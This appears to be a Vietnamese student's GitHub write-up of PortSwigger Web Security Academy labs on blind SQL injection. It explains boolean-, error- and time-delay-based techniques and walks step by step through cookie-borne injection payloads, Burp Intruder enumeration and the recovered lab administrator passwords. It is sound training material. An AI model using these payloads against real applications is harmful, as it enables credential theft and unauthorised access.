![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/092debff-2bce-418b-97f1-e60e63ffdd26)I. Blind SQL injection vul<br>
+ app ko phản hồi kết quả của truy vấn SQL or chi tiết lỗi database trong phản hồi của nó
+ UNION attack ko hiệu quả trong trh này<br>

II. Exploiting blind SQL injection by triggering conditional responses<br>
1. Lý thuyết<br>
+ TrackingId cookie khi đc xử lý -> app sẽ báo là có phải ng dùng đã bt hay ko <br>
-> đây là lỗ hổng can khai thác<br>
+ cho phép xác đinh câu trl cho bất kì điều kiện đơn đc tiêm nào và trích xuất từng phần data tại 1 thời điểm (đúng thì phản hồi sai thì ko)<br>

2. Lab: Blind SQL injection with conditional responses<br>
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection
vulnerability to find out the password of the administrator user. To solve the lab, log in as the administrator user.<br>
https://portswigger.net/academy/labs/launch/5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-responses<br>

3. Giải<br>
+ B1 xác định TrackingId hoạt động ko: Cookie: TrackingId=cokrQmPGjyNp6yK5; (này có sẵn trong phản hồi rồi) -> trả về Welcome Back
+ B2 check phản hồi khi đk đúng or sai:
<br>Đúng: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=1-- -> phản hồi
<br>Sai: Cookie: TrackingId=cokrQmPGjyNp6yK5' and 1=2-- -> ko phản hồi
+ xác định có bảng users ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users limit 1) = 'x'-- -> phản hồi
+ xác định có username 'administrator' ko: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator') = 'x'-- -> phản hồi
+ xác định chiều dài password: Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select 'x' from users where username = 'administrator' and length(password)>1) = 'x'--
+ thử lần lượt đến khi tìm thấy chiều dài phù hợp: 20 (can tìm bằng Intruder)
+ tìm mật khẩu (nhiều kí tự -> xài Burp Intruder):Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,1,1) from users where username='administrator')='§a§'-- (trọng tải đánh vào chữ 'a')
+ vào payload add vào danh sách 0-9, a-z, vào cài đặt phần Grep-match sửa thành 'Welcome' và chạy lấy kết quả<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8c7db2d6-426c-4ed4-876a-86b58ed091bd)<br>

Cookie: TrackingId=cokrQmPGjyNp6yK5' and (select substring(password,2,1) from users where username='administrator')='§a§'-- <br>
-> tiếp tục đến khi tìm đc toàn bộ mật khẩu: pduzuqxql3l3z6bguzec<br>

III. Error-based SQL injection<br>
1. Lý thuyết<br>
- nơi bạn can xài tin nhắn lỗi để trích xuất hoặc suy ra dữ liệu nhạy cảm từ cơ sở dữ liệu dù trong ngữ cảnh mù
- phụ thuộc cấu hình database và loại lỗi bạn can gây ra:<br>
  + khiến app trả về phản hồi lỗi cụ thể dựa trên kết quả biểu thức bool
  + kích hoạt thông báo lỗi xuất data đc truy vấn trả về, biến vul mù thành can thấy được<br>

IV. Exploiting blind SQL injection by triggering conditional errors<br>
1. Lý thuyết<br>
- dùng khi tiêm điều kiện bool khác nhau ko trả về phản hồi khác nhau
- xài cách: sửa truy vấn làm lỗi database chỉ khi đk đúng, thg thì lỗi database sẽ gây ra các phản hồi app khác nhau
- VD:<br>
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a<br>
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a<br>
- xài CASE: check điều kiện và trả về 1 biểu thức khác phụ thuộc vào biểu thức đúng hay ko: BT1: ko có lỗi, BT2: lỗi chia cho 0
- -> dùng để check khi điều kiện tiêm là đúng: xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a<br>

2. lap: Lab: Blind SQL injection with conditional errors<br>
- [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors](https://0a3b0068031732fa8127f2ef006e0086.web-security-academy.net/)<br>
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

 Hint
This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.<br>

3. Giải<br>
+ B1: xác định xem có lỗ hổng SQL ko: Cookie: TrackingId=vcaVyDhReEvMhbkA'; -> có lỗ hổng<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/e909715c-9e84-4264-a92a-3a8d5ffc037f)<br>

+ B2: xác minh lại xem có đúng là do lỗi cú pháp chỉ dùng 1 dấu nháy đơn không Cookie: TrackingId=vcaVyDhReEvMhbkA''; -> ko có lỗi -> đúng cú pháp thì mất lỗi -> có vul SQL<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/d23fd83a-4079-495d-b278-9530915cc69d)<br>

+ B3: để chắc chắn là do lỗi cú pháp -> xài truy vấn con: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '')||'; -> báo lỗi -. chắc chắn lỗi cú pháp<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/e798410e-a2cb-4de2-9553-1b68bc07c8a5)<br>

+ B4: xác định xem tiêm truy vấn vào có được xử lý không: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '' from chau)||'; -> đúng cú pháp nhưng báo lỗi -> có xử lý<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/848c626e-aa5a-4c6a-8b1c-ac1a915e1ce2)<br>

+ B5: xác định có bảng users ko: Cookie: TrackingId=vcaVyDhReEvMhbkA'||(select '' from users where rownum = 1)||'; -> ko báo lỗi -> có<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4023e5ac-4e39-4a1a-b5e5-3eeafb023e09)<br>

+ B6: xác nhận lỗ hổng, thu thập in4: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=1) then to_char(1/0) else '' end from dual)||'; -> xác nhận đk đúng -> báo lỗi<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/16f61c77-4ea5-4348-bb6b-1d761073697c)<br>

+ B7: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=2) then to_char(1/0) else '' end from dual)||'; -> đk sai thì ko báo lỗi<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/06bb3cac-d63d-40a0-b578-ebc6a65d0a14)<br>

+ B8: k.tra tồn tại username = administrator ko: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator')||'; -> báo lỗi -> có<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/a0d2de6a-e282-4f19-af97-440f0e6ee771)<br>

+ B9: dùng burp check độ dài password: TrackingId=tZ0tAR2pIIY23rAn'||(select case when length(password)>§1§ then to_char(1/0) else '' end from users where username = 'administrator')||'; -> dài 20 kí tự<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/912cfcd0-76d7-4d8e-a1b2-ff89c60bd0a8)<br>

+ B10: dùng burp để tìm password: Cookie: TrackingId=tZ0tAR2pIIY23rAn'||(select case when substr(password,§1§,1)='§a§' then to_char(1/0) else '' end from users where username = 'administrator')||';<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/4cb3c50a-ba19-4cc2-8e32-b5aae990f6f7)<br>

-> password: u2plqcroeoaj8z27alxl<br>

V. Extracting sensitive data via verbose SQL error messages<br>
1. Lý thuyết<br>
- lỗi cấu hình database đôi khi gây ra thông báo lỗi rườm rà
- VD: tiêm 1 trích dẫn vào tham số id -> lỗi: Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
- -> chèn trích dẫn đơn vào where -> dễ dàng hơn để tạo 1 truy vấn hợp lệ chứa tải trọng độc hại
- dùng thêm cmt để ngắn trích dẫn thừa phá vỡ cú pháp
- can khiến app tra về thông báo lỗi chứa data, hiệu quả trong biến vul mù thành thấy đc
- -> xài hàm cast() (chuyển đổi loại data): CAST((SELECT example_column FROM example_table) AS int) -> lỗi: ERROR: invalid input syntax for type integer: "Example data"
- hữu ích nếu giới hạn kí tự ngăn bạn kích hoạt phản hồi có điều kiện<br>

2. Lab: Visible error-based SQL injection<br>
- https://portswigger.net/academy/labs/launch/706318b8f1857a10698288c9bf7712276e4ab38822541edeb0385a44da54de78?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-sql-injection-visible-error-based<br>

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.<br>

3. Giải<br>
- B1: xác định có lỗ hổng SQL ko: xài ' -> có<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/518870c4-d4d2-4b33-9c6f-2a7ab4753aae)<br>

- B2: dùng Cookie: TrackingId=3jsfNFcPod3l2wvl'--; ko gây ra lỗi nữa nên xài cú pháp này là hợp lệ
- B3: check nếu đk đúng thì kết quả là gì: Cookie: TrackingId=3jsfNFcPod3l2wvl' and cast((select 1) as int)--; -> báo lỗi<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/46ef4761-338f-453e-bc72-6ff343104383)<br>

-> sửa: Cookie: TrackingId=3jsfNFcPod3l2wvl' and cast((select 1) as int)=1--; -> đúng thì ko báo lỗi nữa<br>

- B4: check users và administrator: Cookie: TrackingId=3jsfNFcPod3l2wvl' and cast((select username from users) as int)=1--; -> lỗi cú pháp do giới hạn số kí tự<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/0fcc55d4-c567-4c34-b367-8e7054ea9c62)<br>

- B5: xóa giá trị id đi để đủ chỗ -> lỗi tra về nh hàng<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/8e9c585b-6dec-47d6-b7cc-bbd4396ddf51)<br>

- B6: giới hạn thành 1 hàng -> trả về username đầu tiên<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/d4528d29-9537-4a81-9a50-8ba5ad02cd68)<br>

- B7: lấy password<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/80446799-1ff4-40e2-89aa-626d9ce40684)<br>

VI. Exploiting blind SQL injection by triggering time delays<br>
1. Lý thuyết<br>
- khi app bắt đc lỗi database khi SQL thực thi nó sẽ xử lý để ko có sự khác biệt trong phản hồi -> kĩ thuật trước ko xài đc
- -> kích hoạt thời gian trễ phụ thuộc điều kiện tiêm là đúng hay sai
- SQL đc xử lý đồng bộ bởi app nên trễ SQL cũng là trễ phản hồi HTTT -> phụ thuộc thời gian phản hồi để xác định đk tiêm là đúng hay sai
- -> xài: '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- -> truy xuất data<br>

2. Lab: Blind SQL injection with time delays<br>
- https://0a180099033748e2809b212e00da0007.web-security-academy.net/<br>

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

 Hint
You can find some useful payloads on our SQL injection cheat sheet.<br>

3. Giải<br>
- B1: dùng: Cookie: TrackingId=3wpvmQos2NXaJqro'||(select pg_sleep(10))--;<br>

4. Lab: Blind SQL injection with time delays and information retrieval<br>
- https://0a29007804b6f5d48092b2800096003a.web-security-academy.net/<br>

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

 Hint
You can find some useful payloads on our SQL injection cheat sheet.<br>

5. Giải<br>
- B1: Cookie: TrackingId=qQH3Ak5p6nidZUwv'; -> ko báo -> check thử time delay
- B2: Cookie: TrackingId=qQH3Ak5p6nidZUwv'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--; -> có trễ -> có SQL
- B3: check user và administrator: Cookie: TrackingId=qQH3Ak5p6nidZUwv'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator')--; -> có delay nên tồn tại users và administrator
- B4: check độ dài password: Cookie: TrackingId=qQH3Ak5p6nidZUwv'||(select case when length(password)=20 then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator')--;  -> delay -> password dài 20 kí tự
- B5: tìm password<br>

![image](https://github.com/bangngoc116/SQL-Injection-/assets/127403046/578ae73f-b89b-4a97-8143-ee1a0727e8c9)<br>

- -> vị trí số 1 là o
- password: o7053hbw7fhvsstlugxq





